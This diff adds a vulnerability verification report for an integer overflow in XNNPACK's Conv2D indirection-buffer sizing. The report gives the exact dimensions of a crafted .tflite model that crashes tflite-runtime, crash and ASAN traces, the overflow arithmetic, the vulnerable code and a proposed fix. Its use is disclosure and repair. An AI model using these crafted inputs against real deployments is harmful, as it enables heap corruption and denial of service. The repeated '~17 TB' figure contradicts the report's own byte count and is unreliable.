@@ -1,0 +1,145 @@
+XNNPACK Conv2D Indirection Buffer Overflow — Production-Level Verification
+==========================================================================
+
+Date:            2026-05-17
+XNNPACK commit:  1052f90 (latest main)
+tflite-runtime:  2.14.0  (production Python package)
+Host:            x86_64, Ubuntu 24.04
+Build configs:   Debug+ASAN/UBSAN (clang-18) AND Release -O2 (no sanitizers)
+
+
+═══════════════════════════════════════════════════════════════════
+PART 1 — CRAFTED .tflite MODEL (676 bytes)
+═══════════════════════════════════════════════════════════════════
+
+File: crafted_conv2d.tflite (676 bytes)
+Generator: make_crafted_tflite.py (pure Python flatbuffers, no TF dependency)
+
+Model structure:
+  Operator:  CONV_2D (builtin_code=3, TFLite schema v3)
+  Input:     [1, 506164742, 506168762, 1]  FLOAT32
+  Filter:    [2, 3, 3, 1]                  FLOAT32, constant (zeros)
+  Bias:      [2]                            FLOAT32, constant (zeros)
+  Output:    [1, 506164740, 506168760, 2]  FLOAT32
+  Padding:   VALID, Stride: 1×1, Dilation: 1×1
+
+TFLite validation:
+  - FlatBufferModel::ValidateModelBuffers()  ✓ PASSES
+  - Op registration (CONV_2D)               ✓ PASSES
+  - Buffer size checks                      ✓ PASSES
+  - "Created TensorFlow Lite XNNPACK delegate for CPU" — delegate ACTIVE
+
+Crash when loaded in tflite-runtime 2.14.0:
+  tflite.Interpreter(model_path="crafted_conv2d.tflite")  → OK
+  interp.allocate_tensors()                               → MemoryError: std::bad_alloc
+
+  Root cause sequence (tflite path):
+    AllocateTensors()
+      → XNNPACK delegate PrepareOps()
+        → reshape_igemm() allocates 61,472 bytes (wrapped integer)
+        → xnn_indirection_init_conv2d begins writing ~17 TB
+        → corrupts adjacent heap / triggers bad_alloc on next allocation
+      OR
+      → TFLite tries to allocate output tensor
+        (~506164740 × 506168760 × 2 × 4 ≈ 2 EB) → std::bad_alloc
+
+  Both paths terminate with a process-killing exception from the .tflite file.
+
+
+═══════════════════════════════════════════════════════════════════
+PART 2 — DIRECT XNNPACK API: RELEASE BUILD (no sanitizers, -O2)
+═══════════════════════════════════════════════════════════════════
+
+Binary: poc_minimal_release  (clang++ -O2, linked against release libXNNPACK.a)
+        poc_igemm_release    (same, full PoC)
+
+Crash trace (strace + custom SIGSEGV handler):
+
+  [RELEASE] xnn_create_runtime_v4() OK
+  [RELEASE] --- xnn_reshape_runtime() ---
+  [RELEASE]   indirection_buffer_size = 8*9*round_up(OH*OW,7)
+  [RELEASE]   = 18446744073709613088 mod 2^64 = 61472 bytes  <- WRAPS
+  [RELEASE]   xnn_reallocate_memory(61472) will SUCCEED
+  [RELEASE]   xnn_indirection_init_conv2d writes ~17 TB -> SIGSEGV imminent
+
+  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x...} ---
+  *** SIGSEGV caught: write exceeded 61,472-byte buffer (17 TB attempted) ***
+
+GDB backtrace (release+debug-symbols binary):
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0x00005555555e3c13 in xnn_indirection_init_conv2d ()
+  #0  xnn_indirection_init_conv2d ()              ← write past buffer
+  #1  reshape_convolution2d_nhwc ()
+  #2  xnn_reshape_convolution2d_nhwc_f32 ()
+  #3  reshape_convolution_operator ()
+  #4  xnn_reshape_runtime ()
+  #5  main ()   [poc_minimal_release.c:~85]
+
+  RIP = xnn_indirection_init_conv2d+1539
+  RSI = 0x1e2b85ba = 506168762  (INPUT_WIDTH, used as dimension index)
+  Signal: SIGSEGV / SEGV_MAPERR  (write to unmapped address)
+
+═══════════════════════════════════════════════════════════════════
+PART 3 — DEBUG+ASAN/UBSAN BUILD (definitive heap-overflow proof)
+═══════════════════════════════════════════════════════════════════
+
+Build: clang-18 -fsanitize=address,undefined -g -O1
+
+ASAN output (igemm path, poc_igemm_overflow):
+
+  Debug (XNNPACK): allocated 61472 bytes for indirection buffer
+      (reshape_igemm, convolution-nhwc.c:2676)
+
+  ERROR: AddressSanitizer: heap-buffer-overflow
+      #0 xnn_indirection_init_conv2d  (indirection.c:63)   ← WRITE PAST BUFFER
+      #1 reshape_igemm                (convolution-nhwc.c:2691)
+      #2 xnn_reshape_convolution2d_nhwc_f32
+      #3 reshape_convolution_operator
+      #4 xnn_reshape_runtime
+
+  SUMMARY: AddressSanitizer: heap-buffer-overflow
+      /XNNPACK/src/indirection.c:63 in xnn_indirection_init_conv2d
+
+═══════════════════════════════════════════════════════════════════
+OVERFLOW ARITHMETIC
+═══════════════════════════════════════════════════════════════════
+
+  Output size:   OH × OW = 506164740 × 506168760 = 256,204,778,801,522,400
+  Tiled size:    round_up(output_size, mr=7)       = 256,204,778,801,522,404
+  True product:  8 × 9 × 256,204,778,801,522,404  = 18,446,744,073,709,613,088
+  After wrap:    mod 2^64                          = 61,472 bytes ← ALLOCATED
+  Actual writes: tiled × kernel × 8               ≈ 18,446,744,073,709,613,088 bytes (~17 TB)
+  Overflow ratio: ×300,083,681,573,881
+
+═══════════════════════════════════════════════════════════════════
+VULNERABLE CODE (convolution-nhwc.c:2624)
+═══════════════════════════════════════════════════════════════════
+
+  // VULNERABLE — no overflow check:
+  const size_t tiled_output_size = round_up(output_size, mr);
+  const size_t indirection_buffer_size =
+      sizeof(void*) * kernel_size * tiled_output_size;  // ← wraps to 61,472
+
+  // FIX — use xnn_safe_mul() available in src/xnnpack/math.h:662:
+  size_t indirection_buffer_size;
+  if (!xnn_safe_mul(sizeof(void*), kernel_size, &indirection_buffer_size) ||
+      !xnn_safe_mul(indirection_buffer_size, tiled_output_size,
+                    &indirection_buffer_size)) {
+      return xnn_status_out_of_memory;
+  }
+
+═══════════════════════════════════════════════════════════════════
+FILES
+═══════════════════════════════════════════════════════════════════
+
+  crafted_conv2d.tflite          676-byte crafted model (triggers crash)
+  make_crafted_tflite.py         Model generator (pure Python flatbuffers)
+  load_crafted_model.py          tflite-runtime loader
+  verify_production_crash.py     Automated crash verification harness
+  poc_minimal_release.c          Minimal release C PoC (flushed output + handler)
+  poc_igemm_overflow.c           Full igemm path PoC
+  poc_conv2d_overflow.c          dwconv path PoC
+  asan_igemm_output.txt          Full ASAN output (heap-buffer-overflow)
+  asan_output.txt                ASAN output (dwconv path)
+  VERIFICATION_REPORT.txt        ASAN/UBSAN verification (Part 1 report)
